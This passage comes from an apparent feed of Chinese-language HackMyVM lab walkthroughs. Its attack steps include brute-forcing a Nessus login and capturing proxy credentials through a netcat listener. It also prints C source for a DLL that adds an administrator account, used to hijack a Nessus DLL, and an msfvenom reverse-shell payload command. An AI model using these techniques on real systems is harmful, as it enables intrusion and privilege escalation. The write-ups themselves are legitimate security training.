└─# cat rid_bruteforce.txt | grep 'SidTypeUser' | cut -d '\' -f2 | cut -d ' ' -f1 &gt; domain_users.txt

┌──(root㉿kali)-[/home/kali/hmv/Nessus]
└─# cat domain_users.txt
Administrator
Guest
DefaultAccount
WDAGUtilityAccount
nesus

<br>可以发现主机有一个 nesus 用户<br><br>┌──(root㉿kali)-[/home/kali/hmv/Nessus]
└─# exiftool My\ Basic\ Network\ Scan_hwhm7q.pdf
ExifTool Version Number         : 12.76
File Name                       : My Basic Network Scan_hwhm7q.pdf
Directory                       : .
File Size                       : 122 kB
File Modification Date/Time     : 2024:11:24 13:09:43+08:00
File Access Date/Time           : 2024:11:24 13:16:35+08:00
File Inode Change Date/Time     : 2024:11:24 13:09:43+08:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
Linearized                      : No
Page Count                      : 5
Profile CMM Type                : Little CMS
Profile Version                 : 2.3.0
Profile Class                   : Display Device Profile
Color Space Data                : RGB
Profile Connection Space        : XYZ
Profile Date Time               : 2004:08:13 12:18:06
Profile File Signature          : acsp
Primary Platform                : Microsoft Corporation
CMM Flags                       : Not Embedded, Independent
Device Manufacturer             : Little CMS
Device Model                    :
Device Attributes               : Reflective, Glossy, Positive, Color
Rendering Intent                : Perceptual
Connection Space Illuminant     : 0.9642 1 0.82491
Profile Creator                 : Little CMS
Profile ID                      : 7fb30d688bf82d32a0e748daf3dba95d
Device Mfg Desc                 : lcms generated
Profile Description             : sRGB
Device Model Desc               : sRGB
Media White Point               : 0.95015 1 1.08826
Red Matrix Column               : 0.43585 0.22238 0.01392
Blue Matrix Column              : 0.14302 0.06059 0.71384
Green Matrix Column             : 0.38533 0.71704 0.09714
Red Tone Reproduction Curve     : (Binary data 2060 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 2060 bytes, use -b option to extract)
Blue Tone Reproduction Curve    : (Binary data 2060 bytes, use -b option to extract)
Chromaticity Channels           : 3
Chromaticity Colorant           : Unknown
Chromaticity Channel 1          : 0.64 0.33
Chromaticity Channel 2          : 0.3 0.60001
Chromaticity Channel 3          : 0.14999 0.06
Profile Copyright               : no copyright, use freely
XMP Toolkit                     : Image::ExifTool 12.76
Date                            : 2024:10:18 15:10:05+02:00
Format                          : application/pdf
Language                        : x-unknown
Author                          : Jose
PDF Version                     : 1.4
Producer                        : Apache FOP Version 2.8
Create Date                     : 2024:10:18 15:10:05+02:00
Creator Tool                    : Apache FOP Version 2.8
Metadata Date                   : 2024:10:18 15:10:05+02:00
Page Mode                       : UseOutlines
Creator                         : Apache FOP Version 2.8

<br>这里获取到了作者是 Jose<br>
这可能是 nessus 的用户因为他不在系统用户当中<br><br>抓包用 jose 作为用户名进行爆破<br>POST sessio/n HTTP/1.1
Host: 192.168.56.156:8834
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/json
X-API-Token: b5c724c0-00ce-4710-9794-59362a41137f
Content-Length: 39
Origin: https://192.168.56.156:8834
Connection: keep-alive
Referer: https://192.168.56.156:8834/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
{"username":"jose","password":"123456"}

<br>ffuf 爆破<br>ffuf -X POST -u 'https://192.168.56.156:8834/session' -d {"username":"jose","password":"FUZZ"}' -w /usr/share/wordlists/rockyou.txt
<br><img alt="09ibvzgi2q1g" src="https://www.c1trus.top/24-渗透/hmv/assets/7uartc0kko.png"><br>
成功爆破出密码是tequiero
登录后台在 ProxyServer 这里可以看到密码<br><img alt="2v10epcykxi" src="https://www.c1trus.top/24-渗透/hmv/assets/i38aqp1tptp.png"><br>
f12 看一下密码
发现密码是 ``<br><img alt="w03pzu93u49" src="https://www.c1trus.top/24-渗透/hmv/assets/4h5viy4mmst.png"><br><br>我们修改这个Host 与 ip  改成我们kali的。
并修改 Auth Method 改成 BASIC <img alt="t0dk9ozjfrn" src="https://www.c1trus.top/24-渗透/hmv/assets/3do4cjbbfht.png"><br>
然后kali监听，在点击 Test Proxy Server 这样可以获取到密码<br>┌──(root㉿kali)-[/home/kali/hmv/Nessus]
└─# nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.56.6] from (UNKNOWN) [192.168.56.156] 49758
CONNECT plugins.nessus.org:443 HTTP/1.1
Proxy-Authorization: Basic bmVzdXM6WiNKdVhIJHBoLTt2QCxYJm1WKQ==
Host: plugins.nessus.org
Connection: keep-Alive
User-Agent: Nessus/10.7.3
Content-Length: 0
Proxy-Connection: Keep-Alive

┌──(root㉿kali)-[/home/kali/hmv/Nessus]
└─# echo 'bmVzdXM6WiNKdVhIJHBoLTt2QCxYJm1WKQ==' |base64 -d
nesus:Z#JuXH$ph-;v@,X&amp;mV)                

<br><br>获取到 nesus 用户的密码 Z#JuXH$ph-;v@,X&amp;mV)<br>之前进行 rid-brute 时可以发现 nesus 是系统的一个用户<br>
我们尝试利用这个用户进行 winrm 连接<br>┌──(root㉿kali)-[/home/kali/hmv/Nessus]
└─# evil-winrm -i 192.168.56.156 -u nesus -p 'Z#JuXH$ph-;v@,X&amp;mV)'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\nesus\Documents&gt;

<br>成功连接<br><br>看下当前用户的权限<br>*Evil-WinRM* PS C:\Users\nesus&gt; whoami /all

USER INFORMATION
----------------

User Name    SID
============ ============================================
nessus\nesus S-1-5-21-2986980474-46765180-2505414164-1001


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

<br>没有什么可以利用的。<br><br>上传winpeas.exe 检测一下<br>*Evil-WinRM* PS C:\Users\nesus\Documents&gt; upload ../../../../../home/winpeas/winPEASx64.exe

Info: Uploading /home/kali/hmv/Nessus/../../../../../home/winpeas/winPEASx64.exe to C:\Users\nesus\Documents\winPEASx64.exe


*Evil-WinRM* PS C:\Users\nesus\Documents&gt; cmd /c 'winPEASx64.exe cmd &gt; output.txt'

^
^C
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1

┌──(root㉿kali)-[/home/kali/hmv/Nessus]
└─# evil-winrm -i 192.168.56.156 -u nesus -p 'Z#JuXH$ph-;v@,X&amp;mV)'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\nesus\Documents&gt; dir


    Directory: C:\Users\nesus\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/24/2024   9:21 PM          74535 output.txt
-a----        11/24/2024   9:18 PM        9842176 winPEASx64.exe

*Evil-WinRM* PS C:\Users\nesus\Documents&gt; download output.txt

Info: Downloading C:\Users\nesus\Documents\output.txt to output.txt

Info: Download successful!

<br>检测发现nessus存在dll注入<br>Tenable Nessus(Tenable, Inc. - Tenable Nessus)["C:\Program Files\Tenable\Nessus\nessus-service.exe"] - Autoload
File Permissions: nesus [AllAccess]
Possible DLL Hijacking in binary folder: C:\Program Files\Tenable\Nessus (nesus [AllAccess])
Tenable Nessus Network Security Scanner

   ==&gt;  C:\Program Files\Tenable\Nessus\.winperms (nesus [AllAccess])
   ==&gt;  C:\Program Files\Tenable\Nessus\fips.dll (nesus [AllAccess])
   ==&gt;  C:\Program Files\Tenable\Nessus\icudt73.dll (nesus [AllAccess])
   ==&gt;  C:\Program Files\Tenable\Nessus\icuuc73.dll (nesus [AllAccess])
   ==&gt;  C:\Program Files\Tenable\Nessus\legacy.dll (nesus [AllAccess])
   ==&gt;  C:\Program Files\Tenable\Nessus\License.rtf (nesus [AllAccess])
   ==&gt;  C:\Program Files\Tenable\Nessus\nasl.exe (nesus [AllAccess])
   ==&gt;  C:\Program Files\Tenable\Nessus\ndbg.exe (nesus [AllAccess])
   ==&gt;  C:\Program Files\Tenable\Nessus\Nessus Web Client.url (nesus [AllAccess])
   ==&gt;  C:\Program Files\Tenable\Nessus\nessus-service.exe (nesus [AllAccess])
   ==&gt;  C:\Program Files\Tenable\Nessus\nessuscli.exe (nesus [AllAccess])
   ==&gt;  C:\Program Files\Tenable\Nessus\nessusd.exe (nesus [AllAccess])

<br><br>这里我利用作者的代码生成一个用于新建管理员的dll<br>#include &lt;stdlib.h&gt;  
  
#include &lt;windows.h&gt;  
 // COMPILE  
// x86_64-w64-mingw32-gcc adduser.c --shared -o adduser.dll  
BOOL APIENTRY DllMain(  
  HANDLE hModule, // Handle to DLL module  
  DWORD ul_reason_for_call, // Reason for calling function  
  LPVOID lpReserved) // Reserved  
{  
  switch (ul_reason_for_call) {  
  case DLL_PROCESS_ATTACH: // A process is loading the DLL.  
    int i;  
    i = system("net user admin admin /add");  
    i = system("net localgroup administrators admin /add");  
    i = system("net localgroup 'remote management' admin /add");  
    i = system("net localgroup 'remote desktop' admin /add");  
    break;  
  case DLL_THREAD_ATTACH: // A process is creating a new thread.  
    break;  
  case DLL_THREAD_DETACH: // A thread exits normally.  
    break;  
  case DLL_PROCESS_DETACH: // A process unloads the DLL.  
    break;  
  }  
  return TRUE;  
}
<br>编译<br>C:\Users\yu&gt;x86_64-w64-mingw32-gcc C:\Users\yu\Desktop\admin.c --shared -o admin.dll
<br>替换名字<br>C:\Program Files\Tenable\Nessus\fips.dll (nesus [AllAccess])
C:\Program Files\Tenable\Nessus\icudt73.dll (nesus [AllAccess])
C:\Program Files\Tenable\Nessus\icuuc73.dll (nesus [AllAccess])
C:\Program Files\Tenable\Nessus\legacy.dll (nesus [AllAccess])
<br>随便找一个替换即可<br>*Evil-WinRM* PS C:\program files\tenable\nessus&gt; mv fips.dll fips_original.dll
*Evil-WinRM* PS C:\program files\tenable\nessus&gt; mv admin.dll fips.dll

<br>重启靶机<br>
尝试使用添加的用户登录<br>┌──(root㉿kali)-[/home/kali/hmv/Nessus]
└─# evil-winrm -i 192.168.56.156 -u admin -p 'admin'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\admin\Documents&gt;
<br>成功登录。管理员用户运行cs后门上线拿flag即可]]></description><link>https://www.c1trus.top/24-渗透/hmv/27.nessus.html</link><guid isPermaLink="false">24-渗透/HMV/27.Nessus.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://www.c1trus.top/24-渗透/hmv/assets/kxrxpqqr598.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://www.c1trus.top/24-渗透/hmv/assets/kxrxpqqr598.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[26.TriplAdvisor]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
<br>靶机链接：https://hackmyvm.eu/machines/machine.php?vm=TriplAdvisor
<br>作者：[josemlwdf](https://hackmyvm.eu/profile/?user=josemlwdf)
<br>难度：
<br>知识点：
<br><br>┌──(root㉿kali)-[/home/kali/hmv/TriplAdvisor]
└─# fscan -h 192.168.56.18

   \_\_\_                              \_
  / \_ \     \_\_\_  \_\_\_ \_ \_\_ \_\_ \_  \_\_\_| | \_\_
 / /\_\/\_\_\_\_/ \_\_|/ \_\_| '\_\_/ \_ |/ \_\_| |/ /
/ /\_\\\_\_\_\_\_\\_\_ \ (\_\_| | | (\_| | (\_\_|   &lt;
\\_\_\_\_/     |\_\_\_/\\_\_\_|\_|  \\_\_,\_|\\_\_\_|\_|\\_\
                     fscan version: 1.8.4
start infoscan
192.168.56.18:445 open
[\*] alive ports len is: 1
start vulscan
已完成 1/1
[\*] 扫描结束,耗时: 3.063691053s
<br>Nmap scan report for 192.168.56.18
Host is up (0.00016s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?
MAC Address: 08:00:27:82:AB:A1 (Oracle VirtualBox virtual NIC)

Host script results:
|\_clock-skew: -49s
| smb2-time:
|   date: 2024-11-21T22:28:31
|\_  start\_date: 2024-11-21T22:24:51
| smb2-security-mode:
|   2:1:0:
|\_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.00 seconds
<br>不出网打不了啊，连域都没启动<br>5b38df6802c305e752c8f02358721acc
<br>4159a2b3a38697518722695cbb09ee46
]]></description><link>https://www.c1trus.top/24-渗透/hmv/26.tripladvisor.html</link><guid isPermaLink="false">24-渗透/HMV/26.TriplAdvisor.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate></item><item><title><![CDATA[25.Simple]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
<br><a data-tooltip-position="top" aria-label="3. 扫下目录" data-href="#3. 扫下目录" href="https://www.c1trus.top/about:blank#3._扫下目录" class="internal-link" target="_self" rel="noopener nofollow">3. 扫下目录</a>
<br><a data-tooltip-position="top" aria-label="4. 用户收集" data-href="#4. 用户收集" href="https://www.c1trus.top/about:blank#4._用户收集" class="internal-link" target="_self" rel="noopener nofollow">4. 用户收集</a>
<br><a data-tooltip-position="top" aria-label="5. SMB共享" data-href="#5. SMB共享" href="https://www.c1trus.top/about:blank#5._SMB共享" class="internal-link" target="_self" rel="noopener nofollow">5. SMB共享</a>
<br>靶机链接：https://hackmyvm.eu/machines/machine.php?vm=Simple
<br>作者：[GatoGamer](https://hackmyvm.eu/profile/?user=GatoGamer)
<br>难度：⭐️⭐️⭐️⭐️⭐️
<br>知识点：
<br><br>┌──(root㉿kali)-[/home/kali/hmv/Simple]
└─# fscan -h 192.168.56.17

   \_\_\_                              \_
  / \_ \     \_\_\_  \_\_\_ \_ \_\_ \_\_ \_  \_\_\_| | \_\_
 / /\_\/\_\_\_\_/ \_\_|/ \_\_| '\_\_/ \_ |/ \_\_| |/ /
/ /\_\\\_\_\_\_\_\\_\_ \ (\_\_| | | (\_| | (\_\_|   &lt;
\\_\_\_\_/     |\_\_\_/\\_\_\_|\_|  \\_\_,\_|\\_\_\_|\_|\\_\
                     fscan version: 1.8.4
start infoscan
192.168.56.17:135 open
192.168.56.17:445 open
192.168.56.17:80 open
192.168.56.17:139 open
[\*] alive ports len is: 4
start vulscan
[\*] NetBios 192.168.56.17   WORKGROUP\SIMPLE
[\*] NetInfo
[\*]192.168.56.17
   [-&gt;]Simple
   [-&gt;]192.168.56.17
[\*] WebTitle http://192.168.56.17      code:200 len:1481   title:Simple
已完成 4/4
[\*] 扫描结束,耗时: 2.735160495s
<br>┌──(root㉿kali)-[/home/kali/hmv/Simple]
└─# nmap 192.168.56.17 -p- -T4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-21 14:50 CST
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.10% done
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.90% done
Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 1.31% done; ETC: 14:54 (0:03:46 remaining)
Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 1.63% done; ETC: 14:53 (0:03:01 remaining)
Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 1.89% done; ETC: 14:54 (0:03:28 remaining)
Nmap scan report for 192.168.56.17
Host is up (0.00014s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49674/tcp open  unknown
<br>又是一个没有域渗透的靶机<br>看下网页吧<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/25.Simple.001.png" referrerpolicy="no-referrer"><br>没啥东西<br><br>没有东西
<br>在源代码里发现一个好玩的<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/25.Simple.002.png" referrerpolicy="no-referrer"><br>这里写了一个url<br>我给他替换一个图片看看<br>本地kali起一个服务器<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/25.Simple.003.png" referrerpolicy="no-referrer"><br>成功替换了图片<br>那我是不是可以上一个马？<br>好吧利用不了<br><br>首页这里可以看到好几个用户<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/25.Simple.004.png" referrerpolicy="no-referrer"><br>ruy
marcos
lander
bogo
vaiper
<br>┌──(root㉿kali)-[/home/kali/hmv/Simple]
└─# crackmapexec smb 192.168.56.17 -u user.txt -p user.txt  --no-bruteforce --continue-on-success
SMB         192.168.56.17   445    SIMPLE           [\*] Windows 10 / Server 2019 Build 17763 x64 (name:SIMPLE) (domain:Simple) (signing:False) (SMBv1:False)
SMB         192.168.56.17   445    SIMPLE           [-] Simple\ruy:ruy STATUS\_LOGON\_FAILURE
SMB         192.168.56.17   445    SIMPLE           [-] Simple\marcos:marcos STATUS\_LOGON\_FAILURE
SMB         192.168.56.17   445    SIMPLE           [-] Simple\lander:lander STATUS\_LOGON\_FAILURE
SMB         192.168.56.17   445    SIMPLE           [-] Simple\bogo:bogo STATUS\_PASSWORD\_EXPIRED
SMB         192.168.56.17   445    SIMPLE           [-] Simple\vaiper:vaiper STATUS\_LOGON\_FAILURE
<br>我们发现bogo用户的密码过期了<br>STATUS_PASSWORD_EXPIRED：这个错误信息表示登录尝试失败，因为密码已过期，无法进行身份验证。<br>我们到virtualbox去重置一下密码<br><br>┌──(root㉿kali)-[/home/kali/hmv/Simple]
└─# smbmap -u bogo -H 192.168.56.17 -p bogo

    \_\_\_\_\_\_\_\_  \_\_\_      \_\_\_  \_\_\_\_\_\_\_   \_\_\_      \_\_\_       \_\_         \_\_\_\_\_\_\_
   /"       )|"  \    /"  ||   \_  "\ |"  \    /"  |     /""\       |   \_\_ "\
  (:   \\_\_\_/  \   \  //   |(. |\_)  :) \   \  //   |    /    \      (. |\_\_) :)
   \\_\_\_  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  \_\_\_\_/
    \_\_/  \   |: \.        |(|  \_  \  |: \.        |  //  \_\_'  \    (|  /
   /" \   :) |.  \    /:  ||: |\_)  :)|.  \    /:  | /   /  \   \  /|\_\_/ \
  (\_\_\_\_\_\_\_/  |\_\_\_|\\_\_/|\_\_\_|(\_\_\_\_\_\_\_/ |\_\_\_|\\_\_/|\_\_\_|(\_\_\_/    \\_\_\_)(\_\_\_\_\_\_\_)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\*] Detected 1 hosts serving SMB
[\*] Established 1 SMB session(s)

[+] IP: 192.168.56.17:445       Name: 192.168.56.17             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Admin remota
        C$                                                      NO ACCESS       Recurso predeterminado
        IPC$                                                    READ ONLY       IPC remota
        LOGS                                                    READ ONLY
        WEB                                                     NO ACCESS
<br>smbclient连接看下有什么东西<br>┌──(root㉿kali)-[/home/kali/hmv/Simple]
└─# smbclient -U 'bogo' //192.168.56.17/IPC$
Password for [WORKGROUP\bogo]:
Try "help" to get a list of possible commands.
smb: \&gt; ls
NT\_STATUS\_NO\_SUCH\_FILE listing \\*
smb: \&gt; exit

┌──(root㉿kali)-[/home/kali/hmv/Simple]
└─# smbclient -U 'bogo' //192.168.56.17/LOGS
Password for [WORKGROUP\bogo]:
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Mon Oct  9 05:23:36 2023
  ..                                  D        0  Mon Oct  9 05:23:36 2023
  20231008.log                        A     2200  Mon Oct  9 05:23:36 2023

                12966143 blocks of size 4096. 11130886 blocks available
smb: \&gt; get 20231008.log
getting file \20231008.log of size 2200 as 20231008.log (58.1 KiloBytes/sec) (average 58.1 KiloBytes/sec)
smb: \&gt;
<br>里面有一个日志<br>PS C:\&gt; dir \\127.0.0.1\WEB

    Directorio: \\127.0.0.1\WEB

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        10/8/2023   9:46 PM                aspnet\_client
-a----        9/26/2023   6:46 PM            703 iisstart.htm


PS C:\&gt; net use \\127.0.0.1\WEB /user:marcos SuperPassword
<br>可以看到marcos用户的密码SuperPassword
<br>
┌──(root㉿kali)-[/home/kali/hmv/Simple]
└─# crackmapexec smb 192.168.56.17 -u marcos -p SuperPassword
SMB         192.168.56.17   445    SIMPLE           [\*] Windows 10 / Server 2019 Build 17763 x64 (name:SIMPLE) (domain:Simple) (signing:False) (SMBv1:False)
SMB         192.168.56.17   445    SIMPLE           [-] Simple\marcos:SuperPassword STATUS\_PASSWORD\_EXPIRED
<br>发现marcos用户的密码也过期了<br>重置一下<br>看下marcos用户的SMB共享<br>
┌──(root㉿kali)-[/home/kali/hmv/Simple]
└─# smbmap -u marcos -H 192.168.56.17 -p 123456

    \_\_\_\_\_\_\_\_  \_\_\_      \_\_\_  \_\_\_\_\_\_\_   \_\_\_      \_\_\_       \_\_         \_\_\_\_\_\_\_
   /"       )|"  \    /"  ||   \_  "\ |"  \    /"  |     /""\       |   \_\_ "\
  (:   \\_\_\_/  \   \  //   |(. |\_)  :) \   \  //   |    /    \      (. |\_\_) :)
   \\_\_\_  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  \_\_\_\_/
    \_\_/  \   |: \.        |(|  \_  \  |: \.        |  //  \_\_'  \    (|  /
   /" \   :) |.  \    /:  ||: |\_)  :)|.  \    /:  | /   /  \   \  /|\_\_/ \
  (\_\_\_\_\_\_\_/  |\_\_\_|\\_\_/|\_\_\_|(\_\_\_\_\_\_\_/ |\_\_\_|\\_\_/|\_\_\_|(\_\_\_/    \\_\_\_)(\_\_\_\_\_\_\_)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\*] Detected 1 hosts serving SMB
[\*] Established 1 SMB session(s)

[+] IP: 192.168.56.17:445       Name: 192.168.56.17             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Admin remota
        C$                                                      NO ACCESS       Recurso predeterminado
        IPC$                                                    READ ONLY       IPC remota
        LOGS                                                    READ ONLY
        WEB                                                     READ, WRITE
<br>生成一个后门然后连上去<br>msfvenom -p windows/meterpreter/reverse\_tcp LHOST=192.168.56.6 LPORT=1234 -f aspx &gt; reverse.aspx 
<br>
被西班牙语的键盘和操作系统恶心到了🤮
<br>SIMPLE{ASPXT0SH311}
<br>SIMPLE{S31MP3R50N4T3PR1V1L363}
]]></description><link>https://www.c1trus.top/24-渗透/hmv/25.simple.html</link><guid isPermaLink="false">24-渗透/HMV/25.Simple.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/25.Simple.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/25.Simple.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[24.liar]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
<br><a data-tooltip-position="top" aria-label="3. SMB探测" data-href="#3. SMB探测" href="https://www.c1trus.top/about:blank#3._SMB探测" class="internal-link" target="_self" rel="noopener nofollow">3. SMB探测</a>
<br><a data-tooltip-position="top" aria-label="4. 相对标识符（RID）暴力枚举出域内的其他用户" data-href="#4. 相对标识符（RID）暴力枚举出域内的其他用户" href="https://www.c1trus.top/about:blank#4._相对标识符（RID）暴力枚举出域内的其他用户" class="internal-link" target="_self" rel="noopener nofollow">4. 相对标识符（RID）暴力枚举出域内的其他用户</a>
<br><a data-tooltip-position="top" aria-label="5. RunasCS.exe" data-href="#5. RunasCS.exe" href="https://www.c1trus.top/about:blank#5._RunasCS.exe" class="internal-link" target="_self" rel="noopener nofollow">5. RunasCS.exe</a>
<br>靶机链接：https://hackmyvm.eu/machines/machine.php?vm=Liar
<br>作者：[sml](https://hackmyvm.eu/profile/?user=sml)
<br>难度：⭐️⭐️
<br>知识点：rid爆破、<a data-tooltip-position="top" aria-label="../../26-工具使用/RunasCS使用" data-href="../../26-工具使用/RunasCS使用" href="https://www.c1trus.top/26-工具使用/runascs使用.html" class="internal-link" target="_self" rel="noopener nofollow">RunasCS</a>.exe工具<br><br>┌──(root㉿kali)-[/home/kali/hmv/liar]
└─# fscan -h 192.168.56.16

   \_\_\_                              \_
  / \_ \     \_\_\_  \_\_\_ \_ \_\_ \_\_ \_  \_\_\_| | \_\_
 / /\_\/\_\_\_\_/ \_\_|/ \_\_| '\_\_/ \_ |/ \_\_| |/ /
/ /\_\\\_\_\_\_\_\\_\_ \ (\_\_| | | (\_| | (\_\_|   &lt;
\\_\_\_\_/     |\_\_\_/\\_\_\_|\_|  \\_\_,\_|\\_\_\_|\_|\\_\
                     fscan version: 1.8.4
start infoscan
192.168.56.16:445 open
192.168.56.16:139 open
192.168.56.16:80 open
192.168.56.16:135 open
[\*] alive ports len is: 4
start vulscan
[\*] NetBios 192.168.56.16   WORKGROUP\WIN-IURF14RBVGV
[\*] NetInfo
[\*]192.168.56.16
   [-&gt;]WIN-IURF14RBVGV
   [-&gt;]192.168.56.16
[\*] WebTitle http://192.168.56.16      code:200 len:63     title:None
已完成 4/4
[\*] 扫描结束,耗时: 2.331772501s
<br>┌──(root㉿kali)-[/home/kali/hmv/liar]
└─# nmap -sC -sV 192.168.56.16 -T4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-21 12:55 CST
Nmap scan report for 192.168.56.16
Host is up (0.00019s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE       VERSION
80/tcp  open  http          Microsoft IIS httpd 10.0
|\_http-title: Site doesn't have a title (text/html).
| http-methods:
|\_  Potentially risky methods: TRACE
|\_http-server-header: Microsoft-IIS/10.0
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
MAC Address: 08:00:27:2F:A2:49 (Oracle VirtualBox virtual NIC)
